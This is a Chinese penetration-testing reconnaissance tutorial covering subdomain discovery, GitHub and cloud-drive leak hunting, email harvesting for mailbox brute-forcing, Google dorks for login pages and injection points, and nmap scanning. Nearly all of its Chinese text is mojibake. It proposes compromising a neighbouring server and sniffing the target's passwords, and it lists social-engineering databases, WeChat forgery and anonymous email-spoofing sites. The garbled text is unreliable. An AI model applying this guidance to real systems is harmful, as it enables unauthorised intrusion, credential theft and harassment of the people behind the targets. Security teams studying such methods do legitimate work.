è¿™ä¸ªæœåŠ¡å™¨ä¸Šé¢æœ‰ç½‘ç«™æˆ‘ä»¬å¯ä»¥æƒ³æƒ³..ä»–æ˜¯ä¸€ä¸ªéå¸¸å¤§çš„ç«™å‡ ä¹æ²¡ä»€ä¹ˆæ¼æ´ï¼ä½†æ˜¯åœ¨ä»–åŒCæ®µ 127.127.127.1127.127.127.255 è¿™ 1255 ä¸Šé¢ä¹Ÿæœ‰æœåŠ¡å™¨è€Œä¸”ä¹Ÿæœ‰ç½‘ç«™å¹¶ä¸”å­˜åœ¨æ¼æ´,é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ¥æ¸—é€ 1~255ä»»ä½•ä¸€ä¸ªç«™ ä¹‹åææƒæ¥å—…æ¢å¾—åˆ°127.4 è¿™å°æœåŠ¡å™¨çš„å¯†ç  ç”šè‡³3389è¿æ¥çš„å¯†ç åå°ç™»å½•çš„å¯†ç  å¦‚æœè¿æ°”å¥½ä¼šå¾—åˆ°å¾ˆå¤šçš„å¯†ç â€¦ ã€5ã€‘APPæå– â€‹ åç¼–è¯‘APPè¿›è¡Œæå–ç›¸å…³IPåœ°å€ï¼Œæ­¤å¤–åœ¨APPä¸ŠæŒ–æ´çš„æ—¶å€™ï¼Œå¯ä»¥å‘ç°å‰é¢æ‹›å¼æ‰¾ä¸åˆ°çš„åŸŸåï¼Œåœ¨APPé‡Œé¢æœ‰å¤§é‡çš„æ¥å£IPå’Œå†…ç½‘ IPï¼ŒåŒæ—¶å¯è·å–ä¸å°‘å®‰å…¨æ¼æ´ã€‚ ã€6ã€‘å¾®ä¿¡å…¬ä¼—å· â€‹ ä¼ä¸šçš„å¦ä¸€é€šé“ï¼Œæ¸—é€ç›¸å…³å…¬ä¼—å·ï¼Œç»å¯¹ä¼šæœ‰æ„å¤–æ”¶è·ï¼šä¸å°‘æ¼æ´+åŸŸåï¼Œæœ‰å…³Burpå¦‚ä½•æŠ“å–å¾®ä¿¡å…¬ä¼—å·æ•°æ®å¯å‚è€ƒ Burp APPæŠ“åŒ…ã€‚ ã€7ã€‘å­—å…¸æšä¸¾æ³• â€‹ å­—å…¸æšä¸¾æ³•æ˜¯ä¸€ç§ä¼ ç»ŸæŸ¥æ‰¾å­åŸŸåçš„æŠ€æœ¯ï¼Œè¿™ç±»å·¥å…·æœ‰ DNSReconcileã€Layerå­åŸŸåæŒ–æ˜æœºã€DirBusterç­‰ã€‚ ã€8ã€‘å…¬å¼€DNSæº Rapid7ä¸‹Sonaré¡¹ç›®å‘å¸ƒçš„ï¼š https://scans.io/study/sonar.fdns_v2ã€‚ DNSå†å²è§£æï¼š https://dnsdb.io/zh-cn/ ã€9ã€‘å¨èƒæƒ…æŠ¥æŸ¥è¯¢ åä¸ºå®‰å…¨æƒ…æŠ¥ https://isecurity.huawei.com 1.3 ç¬¬ä¸‰æ­¥ æ•æ„Ÿä¿¡æ¯æ”¶é›†ã€1ã€‘Webæºä»£ç æ³„éœ² â€‹ é€šè¿‡å·¥å…·æš´ç ´ç›¸å…³Webæºä»£ç æ³„éœ²ï¼Œæµç¨‹å¦‚ä¸‹ï¼š â€‹ æœ€æƒ³å¼ºè°ƒçš„æ˜¯githubä¿¡æ¯æ³„éœ²äº†ï¼Œç›´æ¥å»githubä¸Šæœç´¢ï¼Œæ”¶è·å¾€å¾€æ˜¯å¤§äºä»˜å‡ºã€‚å¯èƒ½æœ‰äººä¸è‡ªä¿¡è®¤ä¸ºæ²¡èƒ½åŠ›å»SRCæŒ–æ´ï¼Œå¯æ˜¯è‚¯å®šä¸æ•¢è¯´ä¸ä¼šä¸Šç½‘ä¸ä¼šæœç´¢ã€‚githubç›¸å…³çš„æ•…äº‹å¤ªå¤šï¼Œä½†æ˜¯ç»™äººå¼•å‡ºçš„ä¿¡æ¯æ³„éœ²è¿œè¿œä¸ä»…åœ¨è¿™é‡Œï¼šgithub.comã€rubygems.orgã€pan.baidu.comâ€¦ QQç¾¤å¤‡æ³¨æˆ–ä»‹ç»ç­‰ï¼Œç”šè‡³æ··å…¥ä¼ä¸šqqå·¥ä½œç¾¤â€¦ â€‹ ç„¶åè¯´å†å¤šï¼Œä¹Ÿæ²¡è¿™ä¸ªå¥½ç”¨ï¼šhttps://sec.xiaomi.com/article/37 å…¨è‡ªåŠ¨ç›‘æ§github ä¿¡æ¯æ³„éœ²æ”¶é›†å¯èƒ½ä¼šç”¨åˆ°å¦‚ä¸‹åœ°å€ï¼š ç½‘ç›˜æœç´¢ï¼šhttp://www.pansou.com/æˆ–https://www.lingfengyun.com/ ç½‘ç›˜å¯†ç ç ´è§£å¯å‚è€ƒï¼šhttps://www.52pojie.cn/thread-763130-1-1.html ç¤¾å·¥ä¿¡æ¯æ³„éœ²ï¼šhttps://www.instantcheckmate.com/ã€http://www.uneihan.com/ æºç æœç´¢ï¼šhttps://searchcode.com/ã€https://gitee.com/ã€gitcafe.comã€code.csdn.net é’Ÿé¦—ä¹‹çœ¼ï¼š https://www.zoomeye.org/ å¤©çœ¼æŸ¥ https://www.tianyancha.com/ å…¶å®ƒï¼šå¨èƒæƒ…æŠ¥ï¼šå¾®æ­¥åœ¨çº¿ã€ ti.360.cnã€ Virustotal ã€2ã€‘é‚®ç®±ä¿¡æ¯æ”¶é›† â€‹ æ”¶é›†é‚®ç®±ä¿¡æ¯ä¸»è¦æœ‰ä¸¤ä¸ªä½œç”¨ï¼š1.é€šè¿‡å‘ç°ç›®æ ‡ç³»ç»Ÿè´¦å·çš„å‘½åè§„å¾‹ï¼Œå¯ä»¥ç”¨æ¥åæœŸç™»å…¥å…¶ä»–å­ç³»ç»Ÿã€‚2.çˆ†ç ´ç™»å…¥é‚®ç®±ç”¨ã€‚ â€‹ é€šå¸¸é‚®ç®±çš„è´¦å·æœ‰å¦‚ä¸‹å‡ ç§ç”Ÿæˆè§„å¾‹ï¼š æ¯”å¦‚æŸå…¬å¸æœ‰å‘˜å·¥åå«åšâ€œå¼ å°ä¸‰â€ï¼Œå®ƒçš„é‚®ç®±å¯èƒ½å¦‚ä¸‹ï¼š &#x7a;&#x68;&#97;&#x6e;&#x67;&#x78;&#x69;&#97;&#111;&#115;&#x61;&#110;&#x40;&#x78;&#x78;&#x78;&#x2e;&#x63;&#111;&#109; &#120;&#x69;&#x61;&#111;&#115;&#97;&#110;&#x2e;&#x7a;&#x68;&#x61;&#110;&#103;&#x40;&#120;&#x78;&#120;&#46;&#x63;&#111;&#x6d; &#122;&#120;&#x69;&#97;&#x6f;&#x73;&#x61;&#110;&#64;&#120;&#120;&#x78;&#x2e;&#99;&#111;&#x6d; â€‹ å½“æˆ‘ä»¬æ”¶é›†å‡ ä¸ªé‚®ç®±ä¹‹åï¼Œä¾¿ä¼šå¤§è‡´çŒœå‡ºå¯¹æ–¹é‚®ç®±çš„å‘½åè§„å¾‹ã€‚é™¤äº†å‘˜å·¥çš„é‚®ç®±ä¹‹å¤–ï¼Œé€šè¿‡å…¬å¸ä¼šæœ‰ä¸€äº›å…±æœ‰çš„é‚®ç®±ï¼Œæ¯”å¦‚äººåŠ›çš„é‚®ç®±ã€å®¢æœçš„é‚®ç®±ï¼Œ&#104;&#114;&#x40;&#x78;&#x78;&#120;&#46;&#x63;&#x6f;&#109;/kefu@xxx.com,è¿™ç§é‚®ç®±æœ‰æ—¶ä¼šå­˜åœ¨å¼±å£ä»¤ï¼Œåœ¨æ¸—é€æ—¶å¯é¢å¤–ç•™æ„ä¸€ä¸‹ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰‹å·¥æˆ–è€…å·¥å…·çš„æ–¹å¼æ¥ç¡®å®šæœé›†é‚®ç®±ï¼š æ‰‹å·¥çš„æ–¹å¼ï¼š 1.å¯ä»¥åˆ°ç™¾åº¦ç­‰æœç´¢å¼•æ“ä¸Šæœç´¢é‚®ç®±ä¿¡æ¯ 2.githubç­‰ç¬¬ä¸‰æ–¹æ‰˜ç®¡å¹³å° 3.ç¤¾å·¥åº“ å·¥å…·æ–¹å¼ï¼š â€‹ åœ¨é‚®ç®±æ”¶é›†é¢†åŸŸä¸å¾—ä¸æä¸€ä¸ªç»å…¸çš„å·¥å…·ï¼ŒThe Harvester,The Harvesterå¯ç”¨äºæœç´¢Googleã€Bingå’ŒPGPæœåŠ¡å™¨çš„ç”µå­é‚®ä»¶ã€ä¸»æœºä»¥åŠå­åŸŸå,å› æ­¤éœ€è¦ç¿»å¢™è¿è¡Œè¯¥å·¥å…·ã€‚å·¥å…·ä¸‹è½½åœ°å€ä¸ºï¼šhttps://github.com/laramies/theHarvester Â· æ³¨ï¼š**python -m pip install -r requirements.txt** å¯¼å…¥ç›¸å…³é…ç½®ï¼Œpython3.6ç‰ˆæœ¬ ä½¿ç”¨æ–¹å¼å¾ˆç®€å•ï¼š ./theHarvester.py -d åŸŸå -1 1000 -b all ã€3ã€‘å†å²æ¼æ´æ”¶é›† â€‹ ä»”ç»†åˆ†æï¼Œå¤§èƒ†éªŒè¯ï¼Œå‘æ•£æ€ç»´ï¼Œå¯¹ä¼ä¸šçš„è¿ç»´ã€å¼€å‘ä¹ æƒ¯äº†è§£ç»å¯¹æ˜¯æœ‰å¾ˆå¤§çš„å¸®åŠ©ã€‚å¯ä»¥æŠŠæ¼æ´ä¿å­˜ä¸‹æ¥ï¼Œè¿›è¡Œç»Ÿè®¡ï¼Œç”šè‡³ç‚«ä¸€ç‚¹å¯ä»¥åšæˆè¯äº‘å±•ç¤ºç»™è‡ªå·±çœ‹ï¼Œçœ‹ç€çœ‹ç€æˆ–è€…å°±çŸ¥é“ä¼šæœ‰ä»€ä¹ˆæ¼æ´ã€‚ wooyun å†å²æ¼æ´åº“ï¼šhttp://www.anquan.us/ æ¼æ´é“¶è¡Œï¼šhttps://www.bugbank.cn/ 360è¡¥å¤©ï¼šhttps://www.butian.net/ æ•™è‚²è¡Œä¸šæ¼æ´æŠ¥å‘Šå¹³å°ï¼ˆBetaï¼‰https://src.edu-info.edu.cn/login/ ã€4ã€‘å·¥å…·ä¿¡æ¯æ”¶é›† å¦‚ï¼š7kbscanã€ç ´å£³Webæé€Ÿæ‰«æå™¨ç­‰ 1.4 ç¬¬å››æ­¥ æŒ‡çº¹è¯†åˆ«ã€Wafã€CDNè¯†åˆ«â€‹ åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¯ä»¥åŠ å…¥ç«¯å£æ‰«æã€æ•æ„Ÿæ–‡ä»¶æ‰«æä¹‹ç±»çš„æ“ä½œï¼Œå·¥å…·å¯è‡ªç”±é€‰æ‹©ï¼Œå¦‚ï¼š å¾¡å‰‘WEBæŒ‡çº¹è¯†åˆ«ç³»ç»Ÿã€whatwebã€Wapplyzerç­‰å·¥å…·ã€‚ â€‹ 1ã€åœ¨çº¿è¯†çº¹è¯†åˆ«ï¼š http://whatweb.bugscaner.com/look/ http://www.yunsee.cn/finger.html 2ã€Wafè¯†åˆ« github.com/EnableSecurity/wafw00f 3ã€CDNè¯†åˆ« https://raw.githubusercontent.com/3xp10it/mytools/master/xcdn.py 1.5 ç¬¬äº”æ­¥ èµ„äº§æ¢³ç†â€‹ æœ‰äº†åºå¤§çš„åŸŸåï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¸®åŠ©SRCæ¢³ç†èµ„äº§äº†ã€‚åŸŸåå¯ä»¥å…ˆåˆ¤æ–­å­˜æ´»ï¼Œæ´»ç€çš„ç»§ç»­è¿›è¡Œç¡®å®šIPç¯èŠ‚ã€‚æ ¹æ®IPçš„åˆ†å¸ƒï¼Œç¡®å®šä¼ä¸šçš„å…¬ç½‘ç½‘æ®µã€‚è¿™å…¶å®æ˜¯ä¸€é¡¹ä¸å°çš„å·¥ç¨‹ï¼Œç²¾å‡†åº¦æ¯”è¾ƒéš¾ä»¥æ‹¿æã€‚ä¸è¿‡é€šè¿‡ä¸æ–­å®æˆ˜ï¼Œè‚¯å®šå¯ä»¥ç¢ç£¨å‡ºä¸€äº›ä¸œè¥¿ï¼Œæ‰€ä»¥æœ‰äººç§°ç™½å¸½å­å¯èƒ½ä¼šæ¯”ä¼ä¸šçš„è¿ç»´æ›´äº†è§£èµ„äº§ä¿¡æ¯ã€‚èµ„äº§æ¢³ç†è¿‡ç¨‹ä¸­å¯èƒ½éœ€è¦å¯¹ç›¸å…³èµ„äº§æ¼æ´è¿›è¡ŒæŸ¥è¯¢ã€åˆ©ç”¨ã€å‘å¸ƒç­‰ï¼Œå¯èƒ½ä¼šç”¨åˆ°å·²ä¸‹ç›¸å…³é“¾æ¥åœ°å€ï¼š SRCä¼—æµ‹å¹³å° å›½é™…æ¼æ´æäº¤å¹³å° https://www.hackerone.com/ BugXåŒºå—é“¾æ¼æ´å¹³å° http://www.bugx.org/ Gsrcç“œå­src https://security.guazi.com/ åŒºå—é“¾å®‰å…¨å“åº”ä¸­å¿ƒ https://dvpnet.io/ CNVDå›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å¹³å° http://www.cnvd.org.cn/ æ¼æ´é“¶è¡Œï¼šhttps://www.bugbank.cn/ 360è¡¥å¤©ï¼šhttps://www.butian.net/ æ•™è‚²è¡Œä¸šæ¼æ´æŠ¥å‘Šå¹³å°ï¼ˆBetaï¼‰https://src.edu-info.edu.cn/login/ å›½å†…å¹³å° çŸ¥é“åˆ›å®‡Seebugæ¼æ´å¹³å° https://www.seebug.org/ å·¥æ§ç³»ç»Ÿè¡Œä¸šæ¼æ´å¹³å° http://ivd.winicssec.com/ æ‰“é€ ä¸­æ–‡æœ€å¤§exploitåº“ http://www.expku.com/ ä¸ºæ•°ä¸å¤šçš„æ¼æ´ç®¡ç†æ’ä»¶æ”¶é›†å¹³å° http://www.bugscan.net/source/template/vulns/ ä¸€å®¶ç®¡ç†æ¼æ´æ”¶é›†çš„å¹³å° http://www.0daybank.org/ å›½å¤–å¹³å° å›½é™…æ¼æ´æäº¤å¹³å° https://www.hackerone.com/ xss poc http://xssor.io/ odayæ¼æ´åº“ https://www.0day.today/ è·¯ç”±å™¨æ¼æ´åº“ http://routerpwn.com/ cveæ¼æ´å¹³å° http://cve.mitre.org/ å¨èƒæƒ…æŠ¥ å®‰å…¨æ•°æ®äº¤æµå¹³å° https://www.secsilo.com/ åä¸ºå®‰å…¨æƒ…æŠ¥ https://isecurity.huawei.com/sec/web/intelligencePortal.do å¨èƒæƒ…æŠ¥å…±äº«å¹³å° https://www.threatcrowd.org/ è¢«é»‘ç«™ç‚¹ç»Ÿè®¡ http://www.hacked.com.cn/ ç¤¾å·¥åº“ å¾®ä¿¡ä¼ªé€  http://www.jietuyun.com/ ä»»æ„é‚®ç®±å‘é€ http://tool.chacuo.net/mailanonymouså’Œhttps://emkei.cz/ ä¸´æ—¶é‚®ç®± http://www.yopmail.com/ é‚®ç®±æ± ç¾¤ http://veryvp.com/ ç¤¾å·¥åº“ http://www.uneihan.com/ 1.6 G**oogleHack**1.6.1 åŠŸèƒ½ä»‹ç»â€‹ ä½¿ç”¨Googleç­‰æœç´¢å¼•æ“å¯¹æŸäº›ç‰¹å®šçš„ç½‘ç»œä¸»æœºæ¼æ´ï¼ˆé€šå¸¸æ˜¯æœåŠ¡å™¨ä¸Šçš„è„šæœ¬æ¼æ´ï¼‰è¿›è¡Œæœç´¢ï¼Œä»¥è¾¾åˆ°å¿«é€Ÿæ‰¾åˆ°æ¼æ´ä¸»æœºæˆ–ç‰¹å®šä¸»æœºçš„æ¼æ´çš„ç›®çš„ã€‚Googleæ¯«æ— ç–‘é—®æ˜¯å½“ä»Šä¸–ç•Œä¸Šæœ€å¼ºå¤§çš„æœç´¢å¼•æ“ã€‚ç„¶è€Œï¼Œåœ¨é»‘å®¢æ‰‹ä¸­ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªç§˜å¯†æ­¦å™¨ï¼Œå®ƒèƒ½æœç´¢åˆ°ä¸€äº›ä½ æ„æƒ³ä¸åˆ°çš„ä¿¡æ¯ã€‚ 1.6.2 éƒ¨ç½²**æŒ‡å—**a) ä¸€å°å¯ä»¥æ­£å¸¸è®¿é—®äº’è”ç½‘çš„è®¾å¤‡ï¼ˆé€šå¸¸ä¸ºPCï¼‰ b) ä¸€ä¸ªå¸¸ç”¨æµè§ˆå™¨ï¼ˆIEã€Chromeç­‰ç­‰ï¼‰ c) æŒæ¡å¼ºå¤§çš„æœç´¢å…³é”®è¯ 1.6.3 å®æˆ˜â€‹ Googleæœç´¢å¼•æ“ä¹‹æ‰€ä»¥å¼ºå¤§ï¼Œå…³é”®åœ¨äºå®ƒè¯¦ç»†çš„æœç´¢å…³é”®è¯ï¼Œä»¥ä¸‹æ˜¯å‡ ä¸ªå¸¸ç”¨çš„æœç´¢å…³é”®è¯ï¼šï¼ˆæ›´å¤šè¯¦ç»†æ•™ç¨‹ï¼Œå‚è§http://user.qzone.qq.com/568311803/mainï¼‰ â€‹ inurl: ç”¨äºæœç´¢ç½‘é¡µä¸ŠåŒ…å«çš„URL. è¿™ä¸ªè¯­æ³•å¯¹å¯»æ‰¾ç½‘é¡µä¸Šçš„æœç´¢,å¸®åŠ©ä¹‹ç±»çš„å¾ˆæœ‰ç”¨. intext: åªæœç´¢ç½‘é¡µéƒ¨åˆ†ä¸­åŒ…å«çš„æ–‡å­—(ä¹Ÿå°±æ˜¯å¿½ç•¥äº†æ ‡é¢˜,URLç­‰çš„æ–‡å­—). site: å¯ä»¥é™åˆ¶ä½ æœç´¢èŒƒå›´çš„åŸŸå. filetype: æœç´¢æ–‡ä»¶çš„åç¼€æˆ–è€…æ‰©å±•å intitle: é™åˆ¶ä½ æœç´¢çš„ç½‘é¡µæ ‡é¢˜. allintitle: æœç´¢æ‰€æœ‰å…³é”®å­—æ„æˆæ ‡é¢˜çš„ç½‘é¡µ. ä½†æ˜¯æ¨èä¸è¦ä½¿ç”¨ link: å¯ä»¥å¾—åˆ°ä¸€ä¸ªæ‰€æœ‰åŒ…å«äº†æŸä¸ªæŒ‡å®šURLçš„é¡µé¢åˆ—è¡¨. ä¾‹å¦‚ğŸ”—www.google.com å°±å¯ä»¥å¾—åˆ°æ‰€æœ‰è¿æ¥åˆ°Googleçš„é¡µé¢ã€‚ ä¸€èˆ¬å¸¸è§ç”¨æ³•æœ‰ï¼š site:ooxx.com filetype:xls site**:xxx.xxx** admin site**:xxx.xxx** login site**:xxx.xxx** system site**:xxx.xxx** ç®¡ç† site**:xxx.xxx** ç™»å½• site**:xxx.xxx** å†…éƒ¨ site**:xxx.xxx** ç³»ç»Ÿ site**:xxx.xxx** é‚®ä»¶ site**:xxx.xxx** email site**:xxx.xxx** qq site**:xxx.xxx** ç¾¤ site**:xxx.xxx** ä¼é¹… site**:xxx.xxx** è…¾è®¯ site:ooxx.com inurl:jmx-console å®ä¾‹ï¼š intext:ç®¡ç† filetype:mdb inurl:file site: baidu.com filetype:txt æŸ¥æ‰¾TXTæ–‡ä»¶ å…¶ä»–çš„ä¾æ¬¡**ç±»**æ¨ site:baidu.com intext:ç®¡ç† site:baidu.com inurl:login site:baidu.com intitle:åå° æŸ¥çœ‹æœåŠ¡å™¨ä½¿ç”¨çš„ç¨‹åº site:baidu.com filetype:asp site:baidu.com filetype:php site:baidu.com filetype:jsp æŸ¥çœ‹ä¸Šä¼ æ¼æ´ï¼š site:baidu**.com** inurl:file site: baidu**.com** inurl:load æŸ¥æ‰¾æ³¨å°„ç‚¹ï¼š site:tw inurl:asp?id= è¿™ä¸ªæ˜¯æ‰¾å°æ¹¾çš„ 1.6.4 Googleçš„ä¼˜åŠ£åŠ¿â€‹ ä¼˜åŠ¿ï¼š l åªéœ€ä¸€å°å¯ä»¥è®¿é—®Googleçš„è”ç½‘è®¾å¤‡ï¼Œéƒ¨ç½²ç®€å•ï¼› l æ£€ç´¢èµ„æºåº“ä¸°å¯Œï¼› åŠ£åŠ¿ï¼š l æœç´¢å…³é”®è¯å¤šï¼Œè®°å¿†å¤æ‚ï¼› l GoogleHackéœ€è¦å€ŸåŠ©æµè§ˆå™¨ï¼Œå±äºåœ¨çº¿å·¥å…·ï¼Œç¦»çº¿ä¸èƒ½ä½¿ç”¨ï¼› l å›½å†…è®¿é—®Googleéœ€å€ŸåŠ©VPNç­‰ç›¸å…³æ‰‹æ®µï¼Œå¢åŠ äº†ä¸Šç½‘æˆæœ¬ 1.7 Nmaphttp://blog.sina.com.cn/s/blog_811d9fdd0101ey07.html åŠŸèƒ½ä»‹ç» http://www.cnblogs.com/c4isr/archive/2012/12/07/2807491.html 10ç§æ‰«ææ–¹å¼è§£é‡Š â€‹ ç”±äºæ˜¯åœ¨win7ä¸Šé¢ä½¿ç”¨ï¼Œæ‰€ä»¥è¦ä½¿ç”¨å…¼å®¹win7çš„winpcapé©±åŠ¨ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨æœ€æ–°ç‰ˆ4.1.2ç‰ˆ winpcap4.1.2ä¸‹è½½åœ°å€ï¼šhttp://www.onlinedown.net/soft/2685.htm 1.7.1 åŠŸèƒ½**ä»‹ç»**Nmapæ˜¯ä¸€ä¸ªç½‘ç»œè¿æ¥ç«¯å£æ‰«æè½¯ä»¶ï¼Œç”¨æ¥æ‰«æç½‘ä¸Šç”µè„‘å¼€æ”¾çš„ç½‘ç»œè¿æ¥ç«¯å£ã€‚ç¡®å®šå“ªäº›æœåŠ¡è¿è¡Œåœ¨å“ªäº›è¿æ¥ç«¯å£ï¼Œå¹¶ä¸”æ¨æ–­è®¡ç®—æœºè¿è¡Œå“ªä¸ªæ“ä½œç³»ç»Ÿã€‚å®ƒæ˜¯ç½‘ç»œç®¡ç†å‘˜å¿…ç”¨çš„è½¯ä»¶ä¹‹ä¸€ï¼Œä»¥åŠç”¨ä»¥è¯„ä¼°ç½‘ç»œç³»ç»Ÿå®‰å…¨ã€‚ åŠŸèƒ½æ¶æ„å›¾ï¼š 1.2.2 éƒ¨ç½²æŒ‡å—ä¸¤ç§éƒ¨ç½²æ–¹å¼ï¼š l Kailé›†æˆç¯å¢ƒ l å•ç‹¬å®‰è£…ï¼ˆä½¿ç”¨yumå·¥å…·ç›´æ¥å®‰è£…å°±å¯ä»¥ï¼‰ 1.2.3 å®æˆ˜Nmapçš„å‚æ•°å’Œé€‰é¡¹ç¹å¤šï¼ŒåŠŸèƒ½éå¸¸ä¸°å¯Œã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹Nmapçš„é€šç”¨å‘½ä»¤æ ¼å¼ï¼šï¼ˆè¯¦ç»†æ•™ç¨‹åŠä¸‹è½½æ–¹å¼å‚è§ï¼šhttp://nmap.org/ï¼‰ Nmap**&lt;æ‰«æé€‰é¡¹&gt;&lt;æ‰«æ****ç›®æ ‡****&gt;** (ä¸€) ä¸»æœºå‘ç° 1) ä¸»æœºå‘ç°åŸç†ä¸»æœºå‘ç°çš„åŸç†ä¸Pingå‘½ä»¤ç±»ä¼¼ï¼Œå‘é€æ¢æµ‹åŒ…åˆ°ç›®æ ‡ä¸»æœºï¼Œå¦‚æœæ”¶åˆ°å›å¤ï¼Œé‚£ä¹ˆè¯´æ˜ç›®æ ‡ä¸»æœºæ˜¯å¼€å¯çš„ã€‚Nmapæ”¯æŒåå¤šç§ä¸åŒçš„ä¸»æœºæ¢æµ‹æ–¹å¼ï¼Œæ¯”å¦‚å‘é€ICMP ECHO/TIMESTAMP/NETMASKæŠ¥æ–‡ã€å‘é€TCPSYN/ACKåŒ…ã€å‘é€SCTP INIT/COOKIE-ECHOåŒ…ï¼Œç”¨æˆ·å¯ä»¥åœ¨ä¸åŒçš„æ¡ä»¶ä¸‹çµæ´»é€‰ç”¨ä¸åŒçš„æ–¹å¼æ¥æ¢æµ‹ç›®æ ‡æœºã€‚ 2) ä¸»æœºå‘ç°**çš„åŸºæœ¬ç”¨æ³•**l -sL: List Scan åˆ—è¡¨æ‰«æï¼Œä»…å°†æŒ‡å®šçš„ç›®æ ‡çš„IPåˆ—ä¸¾å‡ºæ¥ï¼Œä¸è¿›è¡Œä¸»æœºå‘ç°ã€‚ l -sn: Ping Scan åªè¿›è¡Œä¸»æœºå‘ç°ï¼Œä¸è¿›è¡Œç«¯å£æ‰«æã€‚ l -Pn: å°†æ‰€æœ‰æŒ‡å®šçš„ä¸»æœºè§†ä½œå¼€å¯çš„ï¼Œè·³è¿‡ä¸»æœºå‘ç°çš„è¿‡ç¨‹ã€‚ l -PS/PA/PU/PY[portlist]: ä½¿ç”¨TCPSYN/ACKæˆ–SCTP INIT/ECHOæ–¹å¼è¿›è¡Œå‘ç°ã€‚ l -PE/PP/PM: ä½¿ç”¨ICMP echo, timestamp, and netmask è¯·æ±‚åŒ…å‘ç°ä¸»æœºã€‚ l -PO[protocollist]: ä½¿ç”¨IPåè®®åŒ…æ¢æµ‹å¯¹æ–¹ä¸»æœºæ˜¯å¦å¼€å¯ã€‚ l -n/-R: -nè¡¨ç¤ºä¸è¿›è¡ŒDNSè§£æï¼›-Rè¡¨ç¤ºæ€»æ˜¯è¿›è¡ŒDNSè§£æã€‚ l â€“dns-servers &lt;serv1[,serv2],â€¦&gt;: æŒ‡å®šDNSæœåŠ¡å™¨ã€‚ l â€“system-dns: æŒ‡å®šä½¿ç”¨ç³»ç»Ÿçš„DNSæœåŠ¡å™¨ l â€“traceroute: è¿½è¸ªæ¯ä¸ªè·¯ç”±èŠ‚ç‚¹ 3) ä½¿ç”¨**æ¼”ç¤º**æ‰«æå±€åŸŸç½‘10.1.1.1-10.1.1.100èŒƒå›´å†…å“ªäº›IPçš„ä¸»æœºæ˜¯æ´»åŠ¨çš„ã€‚ â€‹ å‘½ä»¤å¦‚ä¸‹ï¼šnmap â€“sn 10.1.1.1-100 ç”±å›¾å¯çŸ¥ï¼š10.1.1.2ã€10.1.1.100ä¸¤å°ä¸»æœºå¤„äºå­˜æ´»çŠ¶æ€ã€‚ (äºŒ) ç«¯å£**æ‰«æ** 1) ç«¯å£**æ‰«æåŸç†**ç«¯å£æ‰«ææ˜¯Nmapæœ€åŸºæœ¬æœ€æ ¸å¿ƒçš„åŠŸèƒ½ï¼Œç”¨äºç¡®å®šç›®æ ‡ä¸»æœºçš„TCP/UDPç«¯å£çš„å¼€æ”¾æƒ…å†µã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒNmapä¼šæ‰«æ1000ä¸ªæœ€æœ‰å¯èƒ½å¼€æ”¾çš„TCPç«¯å£ã€‚Nmapé€šè¿‡æ¢æµ‹å°†ç«¯å£åˆ’åˆ†ä¸º6ä¸ªçŠ¶æ€ï¼šopenï¼šç«¯å£æ˜¯å¼€æ”¾çš„ã€‚closedï¼šç«¯å£æ˜¯å…³é—­çš„ã€‚filteredï¼šç«¯å£è¢«é˜²ç«å¢™IDS/IPSå±è”½ï¼Œæ— æ³•ç¡®å®šå…¶çŠ¶æ€ã€‚unfilteredï¼šç«¯å£æ²¡æœ‰è¢«å±è”½ï¼Œä½†æ˜¯å¦å¼€æ”¾éœ€è¦è¿›ä¸€æ­¥ç¡®å®šã€‚open|filteredï¼šç«¯å£æ˜¯å¼€æ”¾çš„æˆ–è¢«å±è”½ã€‚closed|filtered ï¼šç«¯å£æ˜¯å…³é—­çš„æˆ–è¢«å±è”½ã€‚ ç«¯å£æ‰«ææ–¹é¢éå¸¸å¼ºå¤§ï¼Œæä¾›äº†å¾ˆå¤šçš„æ¢æµ‹æ–¹å¼ï¼š l TCP SYN scanning l TCP connect scanning l TCP ACK scanning l TCP FIN/Xmas/NULL scanning l UDP scanning l å…¶ä»–æ–¹å¼ 2) ç«¯å£**æ‰«æç”¨æ³•**l -sS/sT/sA/sW/sM:æŒ‡å®šä½¿ç”¨ TCP SYN/Connect()/ACK/Window/Maimon scansçš„æ–¹å¼æ¥å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ‰«æã€‚ l -sU: æŒ‡å®šä½¿ç”¨UDPæ‰«ææ–¹å¼ç¡®å®šç›®æ ‡ä¸»æœºçš„UDPç«¯å£çŠ¶å†µã€‚ l -sN/sF/sX: æŒ‡å®šä½¿ç”¨TCP Null, FIN, and Xmas scansç§˜å¯†æ‰«ææ–¹å¼æ¥ååŠ©æ¢æµ‹å¯¹æ–¹çš„TCPç«¯å£çŠ¶æ€ã€‚ l â€“scanflags : å®šåˆ¶TCPåŒ…çš„flagsã€‚ l -sI &lt;zombiehost[:probeport]&gt;: æŒ‡å®šä½¿ç”¨idle scanæ–¹å¼æ¥æ‰«æç›®æ ‡ä¸»æœºï¼ˆå‰æéœ€è¦æ‰¾åˆ°åˆé€‚çš„zombie hostï¼‰ l -sY/sZ: ä½¿ç”¨SCTP INIT/COOKIE-ECHOæ¥æ‰«æSCTPåè®®ç«¯å£çš„å¼€æ”¾çš„æƒ…å†µã€‚ l -sO: ä½¿ç”¨IP protocol æ‰«æç¡®å®šç›®æ ‡æœºæ”¯æŒçš„åè®®ç±»å‹ã€‚ l -b : ä½¿ç”¨FTP bounce scanæ‰«ææ–¹å¼ 3) ä½¿ç”¨**æ¼”ç¤º**åœ¨æ­¤ï¼Œæˆ‘ä»¬ä»¥ä¸»æœº10.1.1.100ä¸ºä¾‹ã€‚å‘½ä»¤å¦‚ä¸‹ï¼šnmap -sS -sU -T4 -top-ports 300 1.1.1.100 å‚æ•°-sSè¡¨ç¤ºä½¿ç”¨TCP SYNæ–¹å¼æ‰«æTCPç«¯å£ï¼›-sUè¡¨ç¤ºæ‰«æUDPç«¯å£ï¼›-T4è¡¨ç¤ºæ—¶é—´çº§åˆ«é…ç½®4çº§ï¼›â€“top-ports 